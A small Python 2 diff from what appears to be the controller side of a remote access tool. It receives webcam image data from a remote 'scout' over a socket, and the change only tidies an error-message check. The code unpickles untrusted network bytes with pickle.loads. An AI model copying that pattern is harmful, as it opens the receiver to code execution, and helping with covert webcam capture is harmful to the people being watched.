@@ -12,8 +12,7 @@ def main(sock):
     print config.inf + 'Waiting for raw webcam pickle to arrive'
     raw_bytes = recv_all.main(sock)
     file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
-    raw_bytes.startswith(config.war + 'Error in scout : ')
-    if raw_bytes.startswith(config.war + 'Error in scout : '):
+    if raw_bytes.startswith('[!]Error'):
         print raw_bytes
     else:
         img = pickle.loads(raw_bytes)
